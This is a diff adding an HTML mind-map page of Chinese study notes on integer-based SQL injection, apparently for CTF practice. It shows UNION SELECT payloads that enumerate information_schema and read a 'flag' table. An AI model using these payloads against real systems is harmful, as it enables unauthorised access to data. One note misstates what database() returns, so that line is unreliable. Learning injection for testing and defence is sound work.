@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="ie=edge" http-equiv="X-UA-Compatible"/>
+<title>Injection</title>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+    }
+
+    #mindmap {
+        display: block;
+        width: 100vw;
+        height: 100vh;
+    }
+    </style>
+<link href="https://cdn.jsdelivr.net/npm/markmap-toolbar@0.15.4/dist/style.css" rel="stylesheet"/>
+<link href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css" rel="stylesheet"/>
+<link href="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets@11.8.0/styles/default.min.css" rel="stylesheet"/>
+</head>
+<body>
+<svg id="mindmap"></svg>
+<script src="https://cdn.jsdelivr.net/npm/d3@7.8.5/dist/d3.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/markmap-view@0.15.4/dist/browser/index.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/markmap-toolbar@0.15.4/dist/index.js"></script>
+<script>(e => { window.WebFontConfig = { custom: { families: ["KaTeX_AMS", "KaTeX_Caligraphic:n4,n7", "KaTeX_Fraktur:n4,n7", "KaTeX_Main:n4,n7,i4,i7", "KaTeX_Math:i4,i7", "KaTeX_Script", "KaTeX_SansSerif:n4,n7,i4", "KaTeX_Size1", "KaTeX_Size2", "KaTeX_Size3", "KaTeX_Size4", "KaTeX_Typewriter"] }, active: () => { e().refreshHook.call() } } })(() => window.markmap)</script>
+<script defer="" src="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.js"></script>
+<script>(() => { setTimeout(() => { const { markmap: M, mm: ge } = window, me = new M.Toolbar; me.attach(ge); const fe = me.render(); fe.setAttribute("style", "position:absolute;bottom:20px;right:20px"), document.body.append(fe) }) })()</script>
+<script>
+        ((F, I, R, H) => {
+            const X = F();
+            window.mm = X.Markmap.create("svg#mindmap", (I||X.deriveOptions)(H), R)
+        })(()=>window.markmap, null, {'content': "<div style='display: flex; justify-content: center; align-items: center;'><img src='../img/injection.png' alt='Injection' style='width: 100px; height: 100px;'></div> <div style='padding-bottom: 20px; text-align: center;'><font color='green'><h3>Injection</h3></font></div>", 'depth': 1, 'children': [{'content': '<h4>SQL Injection</h4>', 'depth': 2, 'children': [{'content': '<b>整数型注入</b>', 'depth': 3, 'children': [{'content': '⚠️注意输出的个数, 相应地限制注入后的结果个数, 如果数目不一致是不会有结果的,<br>所以要循序渐进地限制数据库再限制表名最后爆字段名, 整个过程都需要一致限制结果的数目', 'depth': 4}, {'content': '判断是否存在整数型注入: <code>where id=2-1</code>', 'depth': 4}, {'content': '判断列名: <code>where id=1 order by 1,2,……</code>', 'depth': 4}, {'content': '假设列名为 1 和 2, 用 <code>union select</code> 查询两次', 'depth': 4, 'children': [{'content': '让前一次的查询结果为空以暴露更多的信息, 假设表中没有 id=-1 的值, 此时显示为后一个的查询结果', 'depth': 5}, {'content': '后一次查询必须和前一次查询的列数一致(这里假设中是两列), 不然返回空', 'depth': 5}, {'content': '<code>where id=-1 union select 3,4</code>', 'depth': 5}]}, {'content': '得到数据库名称(假设为 sqli)后再去爆表', 'depth': 4, 'children': [{'content': '<code>database()</code> 是一个特殊的函数, 用于返回数据库服务器上所有可用数据库的列表', 'depth': 5}, {'content': "<code>where id=-1 union select 3, (select table_name from information_schema.tables where table_schema='sqli')</code>", 'depth': 5}, {'content': '限制输出的个数, 由于这里假设输出个数为 2, 所以 <code>limit 0,1</code> 表示从第 0 条开始取 1 条记录', 'depth': 5}, {'content': "<code>where id=-1 union select 3, (select table_name from information_schema.tables where table_schema='sqli' limit 1,1)</code>", 'depth': 5}]}, {'content': '分别获得数据库名称和表名后, 接着爆字段名', 'depth': 4, 'children': [{'content': "假设表名是 flag,<br><code>where id=-1 union select 3, (select column_name from information_schema.columns where table_schema='sqli' and table_name='flag')</code>", 'depth': 5}, {'content': "同样的需要限制输出的个数,<br><code>where id=-1 union select 3, (select column_name from information_schema.columns where table_schema='sqli' and table_name='flag' limit 0,1)", 'depth': 5}, {'content': "⚠️为什么不能是<code>where id=-1 union select column_name from information_schema.columns where table_schema='sqli' and table_name='flag' limit 0,2</code><br>因为这样返回的结果是两行而不是两列", 'depth': 5}]}, {'content': '最后根据数据库、表名、字段查询即可, <code>where id=-1 union select 3, (select flag from sqli.flag limit 0 ,1)</code>', 'depth': 4}]}]}]},
+            {"colorFreezeLevel": 2, "initialExpandLevel": 3}
+        )
+    </script>
+</body>
+</html>
